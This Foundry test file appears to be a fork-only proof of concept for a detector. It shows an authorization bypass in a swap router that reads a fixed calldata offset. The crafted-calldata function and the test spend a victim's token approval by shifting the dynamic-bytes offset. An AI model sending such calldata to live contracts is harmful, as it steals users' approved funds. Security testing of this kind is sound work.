// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

/// @title Fallback PoC -- Authorization on a fixed calldata offset
/// @notice Detector: calldata-offset-auth. A function authorizes by reading an
///         ABSOLUTE calldata position (assembly `calldataload(164)`) and
///         comparing it with the caller. That position only holds the field
///         the check means to read when the ABI encoding is canonical; a
///         dynamic `bytes` parameter may start at any valid offset, so the
///         attacker shifts the payload, puts their own address at the checked
///         slot, and the victim's address in the field the logic actually uses.
/// @dev FORK-ONLY. Reference incident: UniswapV4Router04 (March 2026) --
///      `if iszero(eq(calldataload(164), caller()))` in swap(bytes,uint256),
///      bypassed with a 0xc0 bytes offset, spending a victim's USDC approval.
///      Copy to foundry/test/Exploit.t.sol and run via scripts/run-fork-poc.sh.
///      Requires the victim's approval to still be live at the fork block.
contract PoC is Test {
    address public target;
    address public token;
    address public victim;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        token = vm.envOr("POC_TOKEN", address(0));
        victim = vm.envOr("POC_VICTIM", address(0));
        require(target != address(0), "POC_TARGET not set");
        require(token != address(0), "POC_TOKEN not set (the approved ERC-20)");
        require(victim != address(0), "POC_VICTIM not set (the address whose approval is spent)");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
        assertGt(IERC20(token).balanceOf(victim), 0, "victim holds none of the approved token at this fork block");
    }

    /// Build calldata for `swap(bytes,uint256)` where the dynamic bytes offset
    /// is shifted past the slot the auth check reads. `payerSlotValue` is what
    /// lands at the checked position (the attacker), while `realPayer` is what
    /// the decoded struct carries (the victim).
    function _craftedSwap(bytes4 selector, address attacker, address realPayer, uint256 deadline)
        internal
        pure
        returns (bytes memory)
    {
        // selector(4) | bytes offset(32) | deadline(32) | <payload>
        // Canonical offset is 0x40; shift to 0xc0 so a 128-byte gap exists
        // between the canonical position and the real payload.
        bytes memory payload = abi.encode(realPayer, uint256(0), bytes(""));
        return abi.encodePacked(
            selector,
            abi.encode(uint256(0xc0)), // non-canonical offset to the bytes param
            abi.encode(deadline),
            abi.encode(attacker), // what calldataload(164) will read
            abi.encode(uint256(0)), // gap
            abi.encode(uint256(0x80)), // inner bytes length/offset padding
            payload
        );
    }

    function test_fixedOffsetBypassSpendsVictimApproval() public {
        address attacker = makeAddr("attacker");
        uint256 victimBefore = IERC20(token).balanceOf(victim);
        uint256 attackerBefore = IERC20(token).balanceOf(attacker);

        // Two candidate swap shapes: the observed selector, and the canonical
        // signature in case the target was redeployed with the same bug.
        bytes4[2] memory selectors = [bytes4(0xaf2b4aba), bytes4(keccak256("swap(bytes,uint256)"))];
        bool moved = false;
        for (uint256 i = 0; i < selectors.length && !moved; ++i) {
            vm.prank(attacker);
            (bool ok,) = target.call(_craftedSwap(selectors[i], attacker, victim, block.timestamp + 1));
            console.log("crafted swap returned:", ok);
            moved = IERC20(token).balanceOf(victim) < victimBefore && IERC20(token).balanceOf(attacker) > attackerBefore;
        }

        console.log("victim balance before/after:", victimBefore, IERC20(token).balanceOf(victim));

        assertTrue(
            moved,
            "the crafted swap did not move the victim's tokens. Tried swap(bytes,uint256) by observed selector and by signature, with the dynamic bytes offset shifted to 0xc0. This does NOT establish safety: the router may read a different offset, expose another swap signature, or the victim's approval may already be spent at this fork block. Read the target's assembly check and set the offsets to match it."
        );
    }
}
